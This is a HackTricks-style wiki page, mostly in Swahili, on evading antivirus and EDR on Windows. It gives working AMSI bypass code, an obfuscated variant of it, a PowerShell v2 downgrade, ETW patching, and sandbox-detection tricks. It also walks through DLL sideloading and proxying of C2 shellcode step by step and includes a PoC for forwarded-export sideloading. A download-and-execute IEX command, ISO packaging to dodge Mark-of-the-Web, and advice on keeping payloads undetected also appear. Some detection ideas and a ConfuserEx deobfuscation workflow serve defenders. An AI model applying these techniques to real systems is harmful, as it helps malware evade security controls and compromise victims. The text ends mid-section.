# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kusimamisha Windows Defender kwa kuiga AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu mbalimbali za kuangalia kama faili ni mbaya au la: static detection, dynamic analysis, na kwa EDRs zilizo juu zaidi, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kuangazia known malicious strings au arrays za bytes ndani ya binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mfano file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia public tools zinazojulikana kunaweza kukufanya ugunduliwe kwa urahisi, kwa sababu huenda tayari zimechunguzwa na kuorodheshwa kama zenye hatari. Kuna njia kadhaa za kuzunguka aina hii ya utambuzi:

- **Encryption**

Ikiwa utaencrypt binary, hakutakuwa na njia kwa AV kugundua program yako, lakini utahitaji aina fulani ya loader ili decrypt na kuendesha program hiyo kwenye memory.

- **Obfuscation**

Wakati mwingine unachotakiwa kufanya ni kubadilisha baadhi ya strings katika binary au script yako ili ipite mbele ya AV, lakini hili linaweza kuwa kazi inayochukua muda kulingana na unachojaribu obfuscate.

- **Custom tooling**

Ikiwa utatengeneza tools zako mwenyewe, haitakuwa na known bad signatures, lakini hii inachukua muda mwingi na juhudi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa msingi split faili kwenye segments nyingi kisha kuagiza Defender iscan kila segment moja moja, kwa njia hii inaweza kukuambia kwa usahihi ni strings au bytes zipi zilizopigwa flag katika binary yako.

Ninapendekeza uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapoweka binary yako ndani ya sandbox na kuangalia shughuli za uharibifu (mfano kujaribu decrypt na kusoma passwords za browser, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini hapa kuna mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi imeimplementiwa, inaweza kuwa njia nzuri ya kupita dynamic analysis ya AV. AVs zina muda mfupi sana wa kuscan faili ili zisitokee kuingilia mtiririko wa kazi wa mtumiaji, hivyo kutumia long sleeps kunaweza kuingilia uchunguzi wa binaries. Tatizo ni kwamba sandboxes za AV nyingi zinaweza kupita sleep tu kulingana na jinsi imekaziwa.
- **Checking machine's resources** Kwa kawaida Sandboxes zina resources chache (mfano < 2GB RAM), vinginevyo zingedharauzesha machine ya mtumiaji. Unaweza kuwa mbunifu hapa, kwa mfano ukakagua joto la CPU au hata fan speeds, sio kila kitu kitatekelezwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza kufanya check kwenye domain ya kompyuta kuona kama inalingana na ile uliyotaja; kama haitalingani, unaweza kufanya program yako exit.

Inabainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hivyo, unaweza kukagua computer name katika malware yako kabla ya detonation; ikiwa name inalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya vidokezo vingine nzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu jinsi ya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali, public tools hatimaye zitagunduliwa, kwa hivyo, jiulize jambo hili:

Kwa mfano, kama unataka dump LSASS, je, kweli unahitaji kutumia mimikatz? Au unaweza kutumia project nyingine ambayo hairuhusiwi sana na pia inadump LSASS?

Jibu sahihi labda ni hili la pili. Kuchukua mimikatz kama mfano, huenda ikawa moja ya, kama sio ile iliyopigwa flag zaidi, kipande cha malware na AVs na EDRs; ingawa project yenyewe ni nzuri sana, pia ni nightmare kuifanya iwe kazi ili kuzunguka AVs, kwa hivyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha kuzima automatic sample submission katika defender, na tafadhali, kwa uzito, **USIPANUELEZE VIRUSTOTAL** ikiwa lengo lako ni kufanikiwa evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, install kwenye VM, jaribu kuzima automatic sample submission, na ifanyie majaribio huko hadi utakapofurahi na matokeo.

## EXEs vs DLLs

Iwapo inawezekana, daima precedence kutumia DLLs kwa ajili ya evasion; kwa uzoefu wangu, DLL files kwa kawaida huishikiwa na kugunduliwa kidogo sana, hivyo ni mbinu rahisi sana ya kuepuka utambuzi katika baadhi ya kesi (kama payload yako ina njia ya kukimbia kama DLL bila shaka).

Kama tunaweza kuona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks unaweza kutumia na DLL files ili kuwa na ujasiri zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia faida ya DLL search order inayotumika na loader kwa kuweka victim application na malicious payload(s) karibu pamoja.

Unaweza kuangalia programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Ninapendekeza sana **uchunguze mwenyewe programu za DLL Hijackable/Sideloadable**, mbinu hii ni ya kimya sana inapofanywa ipasavyo, lakini ikiwa utatumia programu za DLL Sideloadable zinazojulikana kwa umma, unaweza kukamatwa kwa urahisi.

Kuweka tu malicious DLL yenye jina ambalo programu inatarajia kupakia haitapakia payload yako, kwa sababu programu inatarajia kazi maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine iitwayo **DLL Proxying/Forwarding**.

**DLL Proxying** inapitisha miito ambayo programu inafanya kutoka kwa proxy (na malicious) DLL kwenda DLL ya asili, hivyo ikihifadhi utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitatumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha chanzo cha DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana utakapoangalia [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili kujifunza zaidi kuhusu tuliyojadili kwa kina.

### Kutumia Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Ipakue `TargetDll` ikiwa bado haijaload
- Tafuta `TargetFunc` kutoka kwake

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (kunakili na kubandika):
1) Nakili DLL ya mfumo iliyosainiwa kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda hiyo hiyo. DllMain ndogo ya msingi inatosha kupata utekelezaji wa msimbo; huna haja ya kutekeleza forwarded function ili kusababisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (imesainiwa) inapakia side-by-side `keyiso.dll` (imesainiwa)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapata kosa la "missing API" tu baada ya `DllMain` tayari kukimbia

Hunting tips:
- Zingatia forwarded exports ambapo moduli lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama inventory ya forwarder ya Windows 11 ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia signed DLLs kutoka non-system paths, na kisha zinapakia non-KnownDLLs zenye base name sawa kutoka kwenye directory hiyo
- Toa onyo kuhusu mnyororo wa process/module kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya user-writable paths
- Tekeleza sera za code integrity (WDAC/AppLocker) na kataa write+execute katika application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit ya ku-bypass EDRs kwa kutumia suspended processes, direct syscalls, na alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia fiche.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kukwepa kugunduliwa ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu — iwezekanavyo jaribu kuunganisha mbinu kadhaa za kukwepa.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza tu kuchambua **files on disk**, hivyo kama ungeweza kutekeleza payloads **in-memory**, AV haingeweza kufanya chochote kuzuia, kwa kuwa haikuwa na mwonekano wa kutosha.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia za scripts kwa kufunua yaliyomo kwenye script kwa njia ambayo hayajakifichwa na hayajaundwa kwa obfuscation.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

Hatujaweka faili lolote kwenye diski, lakini bado tulikamatwa while executing in-memory kwa sababu ya AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

Kuna njia chache za kuzidi AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa kiasi kikubwa inategemea detections za static, hivyo, kubadilisha scripts unazojaribu kuziweka inaweza kuwa njia nzuri ya kukwepa ugundaji.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation hata kama ina tabaka kadhaa, hivyo obfuscation inaweza isiwe chaguo zuri kulingana na jinsi inavyofanywa. Hii inafanya isiwe rahisi kukwepa. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha baadhi ya majina ya variable na utakuwa sawa, hivyo inategemea kiasi ambacho kitu kimekuwa kimeorodheshwa.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Kusababisha AMSI initialization kushindwa (amsiInitFailed) kutasababisha hakuna scan itakayozinduliwa kwa process ya sasa. Huu ulifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa powershell code ili kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Laini hii bila shaka imetambuliwa na AMSI yenyewe, hivyo inahitajika marekebisho ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyopata kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, kuna uwezekano hili litachukuliwa kama hatari mara chapisho hili litakapotoka, hivyo usichapishe code ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa mwanzoni na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anuani ya kazi ya "AmsiScanBuffer" katika amsi.dll (inyenye inawajibika kukagua data iliyotolewa na mtumiaji) na kuiandika juu kwa maagizo yanayorejesha nambari ya E_INVALIDARG; kwa njia hii, matokeo ya uchunguzi yenyewe yatarudisha 0, ambayo huchukuliwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Kuna mbinu nyingi nyingine zinazotumiwa kupita AMSI kwa powershell, angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili ujifunze zaidi kuhusu hizo.

Chombo hiki [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) pia hutoa script za kupita AMSI.

**Ondoa saini iliyotambuliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyotambuliwa kutoka kwenye memory ya process ya sasa. Zana hii inafanya kazi kwa kuchunguza memory ya process ya sasa kwa ajili ya saini ya AMSI kisha kuibandika tena kwa maagizo ya NOP, kwa ufanisi kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell version 2**
Ikiwa unatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni sifa inayokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa ya msaada kwa auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa wanavurugu wanaotaka kuepuka kugunduliwa**.

To bypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa kusudi hili.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell bila defenses (hili ndilo `powerpick` kutoka Cobal Strike linavyotumia).

## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea encrypting data, ambayo itaongeza entropia ya binary na kufanya AVs na EDRs ziwe rahisi kugundua. Kuwa mwangalifu na hili na pengine tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinazohitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au forks za kibiashara) mara nyingi utakutana na ngazi kadhaa za ulinzi zitakazowazuia decompilers na sandboxes. Workflow hapa chini inarejesha kwa uaminifu **near–original IL** ambayo baadaye inaweza ku-decompile hadi C# kwa kutumia zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). Hii pia inapatch checksum ya PE hivyo mabadiliko yoyote yatasababisha binary ifuate crash. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kurecover XOR keys na kuandika assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina parameters 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati ukijenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – peana faili *clean* kwa **de4dot-cex** (fork ya de4dot yenye uelewa wa ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua ConfuserEx 2 profile  
• de4dot itaondoa control-flow flattening, kurejesha namespaces za asili, classes na majina ya variables na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx inabadilisha method calls za moja kwa moja kuwa wrappers nyepesi (a.k.a *proxy calls*) ili kuvunja further decompilation. Ondoa hizo kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona kawaida .NET API kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions za giza (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyopatikana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload ya *kweli*. Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyowekwa ndani ya `<Module>.byte_0`.

Mnyororo hapo juu unarejesha execution flow **without** haja ya kuendesha sampuli yenye madhara – yenye msaada wakati unafanya kazi kwenye workstation isiyounganishwa.

> 🛈  ConfuserEx hutengeneza attribute maalum inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC ku-triage samples moja kwa moja.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuscator ya C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kutoa ulinzi zaidi wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kucompile, obfuscated code bila kutumia zana za nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayejaribu kuvunja application kuwa ngumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages ikitumia ROP (return-oriented programming). ROPfuscator inaficha programu kwenye assembly code level kwa kubadilisha instructions za kawaida kuwa ROP chains, ikizuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter imeandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzipakia

## SmartScreen & MoTW

Labda umeona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuziendesha.

Microsoft Defender SmartScreen ni mekanismo ya usalama iliyolengwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications ambazo zinaweza kuwa za hatari.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi kwa mtazamo wa msingi wa sifa (reputation-based approach), ikimaanisha kwamba applications zisizopakuliwa mara kwa mara zitatia off SmartScreen na kuonya na kuzuia mtumiaji wa mwisho kuendesha faili (hata hivyo faili bado zinaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa moja kwa moja unapopakua faili kutoka mtandaoni, pamoja na URL kutoka ambako ilipakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyopakuliwa kutoka mtandaoni.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizotiwa saini kwa cheti cha kusaini kinachothibitishwa (**trusted**) **hazitowashi SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kuzifunga ndani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **cannot** kutumika kwenye volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayofunga payloads kwenye output containers ili kuepuka Mark-of-the-Web.

Mfano wa utumiaji:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mfumo wenye nguvu wa kurekodi matukio kwenye Windows unaowawezesha programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, pia inaweza kutumiwa na bidhaa za usalama kuangalia na kugundua shughuli zenye madhara.

Vivyo hivyo jinsi AMSI inavyozimwa (bypassed) inawezekana pia kufanya yafunction ya user space `EtwEventWrite` irudie mara moja bila kurekodi matukio yoyote. Hii hufanyika kwa kupatch function hiyo katika memory ili irudie mara moja, hivyo kwa ufanisi kuzima kurekodi kwa ETW kwa mchakato huo.

Unaweza kupata taarifa zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory imejulikana kwa muda mrefu na bado ni njia nzuri ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itawekwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kushughulikia patch ya AMSI kwa mchakato mzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa kuendesha C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuumba mchakato mpya wa kujitoa** (sacrificial process), ku-inject code yako ya post-exploitation ndani ya mchakato huo mpya, kuendesha code yako ya uharibifu na ukimaliza, kuua mchakato mpya. Hii ina faida zake na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba kama kitu kimeenda vibaya au kimegunduliwa katika kitendo chetu cha post-exploitation, kuna **uwezekano mkubwa** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu ku-inject code ya post-exploitation ya uharibifu **ndani ya mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukiwekwa chini ya skana ya AV, lakini hasara ni kwamba kama kitu kitatokea vibaya kwa utekelezaji wa payload yako, kuna **uwezekano mkubwa** wa **kupoteza beacon yako** kwani inaweza kufunguka (crash).

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
